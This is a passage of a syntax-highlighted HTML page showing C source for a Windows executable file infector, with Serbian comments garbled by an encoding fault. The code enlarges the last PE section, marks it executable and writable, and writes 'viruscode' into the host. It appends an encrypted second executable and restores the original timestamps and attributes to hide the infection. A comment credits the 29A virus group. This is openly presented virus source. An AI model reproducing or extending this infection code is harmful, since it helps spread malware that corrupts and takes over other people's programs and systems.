    </span><span class="sc2">// Promeni veliÅinu poslednje sekcije i celog fajla
</span><span class="sc0">    </span><span class="sc11">oldoffs1</span><span class="sc10">=</span><span class="sc11">filemap</span><span class="sc10">-</span><span class="sc11">filestart</span><span class="sc10">+</span><span class="sc4">16</span><span class="sc10">;</span><span class="sc0">                              </span><span class="sc2">// zapamti fajl ofset i
</span><span class="sc0">    </span><span class="sc11">olddata1</span><span class="sc10">=((</span><span class="sc11">PIMAGE_SECTION_HEADER</span><span class="sc10">)</span><span class="sc11">filemap</span><span class="sc10">)-&gt;</span><span class="sc11">SizeOfRawData</span><span class="sc10">;</span><span class="sc0">   </span><span class="sc2">// stare podatke na tom mestu
</span><span class="sc0">    </span><span class="sc10">((</span><span class="sc11">PIMAGE_SECTION_HEADER</span><span class="sc10">)</span><span class="sc11">filemap</span><span class="sc10">)-&gt;</span><span class="sc11">SizeOfRawData</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">align_virussize</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">fsize</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">align_virussize</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">overlay</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc2">// Promeni veliÅinu poslednje sekcije (VirtualSize) ako &lt;&gt; 0
</span><span class="sc0">    </span><span class="sc11">oldoffs4</span><span class="sc10">=</span><span class="sc11">filemap</span><span class="sc10">-</span><span class="sc11">filestart</span><span class="sc10">+</span><span class="sc4">8</span><span class="sc10">;</span><span class="sc0">                                   </span><span class="sc2">// zapamti fajl offset i
</span><span class="sc0">    </span><span class="sc11">olddata4</span><span class="sc10">=((</span><span class="sc11">PIMAGE_SECTION_HEADER</span><span class="sc10">)</span><span class="sc11">filemap</span><span class="sc10">)-&gt;</span><span class="sc11">Misc</span><span class="sc10">.</span><span class="sc11">VirtualSize</span><span class="sc10">;</span><span class="sc0">    </span><span class="sc2">// stare podatke na tom mestu
</span><span class="sc0">    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">olddata4</span><span class="sc10">)</span><span class="sc0">                                                   </span><span class="sc2">// setuj novu veliÅinu ako je ona &lt;&gt; 0
</span><span class="sc0">        </span><span class="sc10">((</span><span class="sc11">PIMAGE_SECTION_HEADER</span><span class="sc10">)</span><span class="sc11">filemap</span><span class="sc10">)-&gt;</span><span class="sc11">Misc</span><span class="sc10">.</span><span class="sc11">VirtualSize</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">PIMAGE_SECTION_HEADER</span><span class="sc10">)</span><span class="sc11">filemap</span><span class="sc10">)-&gt;</span><span class="sc11">SizeOfRawData</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc2">// Promeni veliÅinu sekcije (opet), ako ona postoji u DirectoryData.
</span><span class="sc0">    </span><span class="sc2">// prvo se mora ustanoviti koja je sekcija u pitanju: koje sekcije RVA
</span><span class="sc0">    </span><span class="sc2">// spada ovde (kao malo pre)
</span><span class="sc0">    </span><span class="sc11">oldoffs2</span><span class="sc10">=</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">IMAGE_NUMBEROF_DIRECTORY_ENTRIES</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">entry_idd</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]).</span><span class="sc11">VirtualAddress</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">PIMAGE_SECTION_HEADER</span><span class="sc10">)</span><span class="sc11">filemap</span><span class="sc10">)-&gt;</span><span class="sc11">VirtualAddress</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">temp</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc2">// naÑao sekciju, zapamti stare vrednosti
</span><span class="sc0">            </span><span class="sc11">oldoffs2</span><span class="sc10">=(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;(</span><span class="sc11">entry_idd</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">Size</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">filestart</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">olddata2</span><span class="sc10">=(</span><span class="sc11">entry_idd</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]).</span><span class="sc11">Size</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc2">// promeni i njoj veliÅinu
</span><span class="sc0">            </span><span class="sc10">(</span><span class="sc11">entry_idd</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]).</span><span class="sc11">Size</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">align_virussize</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc11">i</span><span class="sc10">++;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc2">// Promeni karakteristiku ove poslednje sekcije (by Jacky Qwerty/29A)
</span><span class="sc0">    </span><span class="sc11">oldoffs3</span><span class="sc10">=</span><span class="sc11">filemap</span><span class="sc10">-</span><span class="sc11">filestart</span><span class="sc10">+</span><span class="sc4">36</span><span class="sc10">;</span><span class="sc0">                              </span><span class="sc2">// zapamti fajl ofset i
</span><span class="sc0">    </span><span class="sc11">olddata3</span><span class="sc10">=((</span><span class="sc11">PIMAGE_SECTION_HEADER</span><span class="sc10">)</span><span class="sc11">filemap</span><span class="sc10">)-&gt;</span><span class="sc11">Characteristics</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc2">// stare podatke na tom mestu
</span><span class="sc0">    </span><span class="sc10">((</span><span class="sc11">PIMAGE_SECTION_HEADER</span><span class="sc10">)</span><span class="sc11">filemap</span><span class="sc10">)-&gt;</span><span class="sc11">Characteristics</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">IMAGE_SCN_MEM_EXECUTE</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">IMAGE_SCN_MEM_READ</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">IMAGE_SCN_MEM_WRITE</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc2">// Promeni SizeOfImage za align_virussize
</span><span class="sc0">    </span><span class="sc11">oldoffs5</span><span class="sc10">=(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">SizeofImage</span><span class="sc10">-(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">filestart</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">olddata5</span><span class="sc10">=*</span><span class="sc11">SizeofImage</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">*</span><span class="sc11">SizeofImage</span><span class="sc10">+=</span><span class="sc11">align_virussize</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">kript</span><span class="sc10">=(</span><span class="sc16">char</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">GetTickCount</span><span class="sc10">();</span><span class="sc0">    </span><span class="sc2">// zapamti i sluÅajan broj koji sluÇi za dekriptovanje
</span><span class="sc0">
</span><span class="sc9">#ifdef I_TESTMODE
</span><span class="sc0">    </span><span class="sc11">WriteFile</span><span class="sc10">(</span><span class="sc11">testIfile</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\r\nwrite"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">7</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">Iwritten</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">




</span><span class="sc3">/*** UPISIVANJE U FAJL ***/</span><span class="sc0">

    </span><span class="sc2">// UpiÑi virus u fajl
</span><span class="sc0">    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">j</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc10">&lt;</span><span class="sc11">raw_virussize</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc11">virusstart</span><span class="sc10">[</span><span class="sc11">j</span><span class="sc10">]=</span><span class="sc11">viruscode</span><span class="sc10">[</span><span class="sc11">j</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc2">// UpiÑi i exe odmah posle
</span><span class="sc0">    </span><span class="sc11">virusstart</span><span class="sc10">=&amp;</span><span class="sc11">virusstart</span><span class="sc10">[</span><span class="sc11">raw_virussize</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc11">ReadFile</span><span class="sc10">(</span><span class="sc11">haddfile</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">virusstart</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">addfile_size</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">LPDWORD</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">i</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc2">// Kriptuj fajl jednostavno i uvek sluÅajno
</span><span class="sc0">    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">j</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc10">&lt;</span><span class="sc11">addfile_size</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc10">++,</span><span class="sc0"> </span><span class="sc11">kript</span><span class="sc10">+=</span><span class="sc4">173</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">virusstart</span><span class="sc10">[</span><span class="sc11">j</span><span class="sc10">]-=</span><span class="sc11">kript</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc2">// zatvori add exe fajl
</span><span class="sc0">    </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">haddfile</span><span class="sc10">);</span><span class="sc0">





</span><span class="sc3">/*** REGULARAN KRAJ ***/</span><span class="sc0">

    </span><span class="sc11">retvalue</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">FlushViewOfFile</span><span class="sc10">(</span><span class="sc11">filestart</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">   </span><span class="sc2">// upiÑi sve promene nazad u fajl
</span><span class="sc11">end4</span><span class="sc10">:</span><span class="sc0">
    </span><span class="sc11">UnmapViewOfFile</span><span class="sc10">(</span><span class="sc11">filestart</span><span class="sc10">);</span><span class="sc0">     </span><span class="sc2">// zatvari MMF view
</span><span class="sc11">end3</span><span class="sc10">:</span><span class="sc0">
    </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">hfilemap</span><span class="sc10">);</span><span class="sc0">          </span><span class="sc2">// zatvori MMF
</span><span class="sc0">    </span><span class="sc2">// bez obzira da li je fajl uspeÑno inficiran ili ne treba setovati
</span><span class="sc0">    </span><span class="sc2">// njegovu veliÅinu, jer ako je nastala greÑka veliÅina fajla Üe
</span><span class="sc0">    </span><span class="sc2">// se poveÜati, a virus neÜe biti dodat!
</span><span class="sc0">    </span><span class="sc2">// namesti regularnu veliÅinu fajla
</span><span class="sc0">    </span><span class="sc11">SetFilePointer</span><span class="sc10">(</span><span class="sc11">hfile</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">fsize</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FILE_BEGIN</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">SetEndOfFile</span><span class="sc10">(</span><span class="sc11">hfile</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc2">// vrati staro vreme
</span><span class="sc0">    </span><span class="sc11">SetFileTime</span><span class="sc10">(</span><span class="sc11">hfile</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">creation_time</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">lastacc_time</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">lastwr_time</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc2">// a i atribute (ako je bio read-only)
</span><span class="sc0">    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fattr</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc11">FILE_ATTRIBUTE_READONLY</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">SetFileAttributes</span><span class="sc10">(</span><span class="sc11">fname</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">fattr</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">end2</span><span class="sc10">:</span><span class="sc0">
    </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">hfile</span><span class="sc10">);</span><span class="sc0">         </span><span class="sc2">// zatvori fajl
</span><span class="sc11">end1</span><span class="sc10">:</span><span class="sc0">

</span><span class="sc9">#ifdef I_TESTMODE
</span><span class="sc0">    </span><span class="sc11">WriteFile</span><span class="sc10">(</span><span class="sc11">testIfile</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\r\nend"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">5</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">Iwritten</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">testIfile</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">retvalue</span><span class="sc10">;</span><span class="sc0">            </span><span class="sc2">// vrati rezultat
</span><span class="sc10">}</span><span class="sc0">

</span></div></body>
</html>
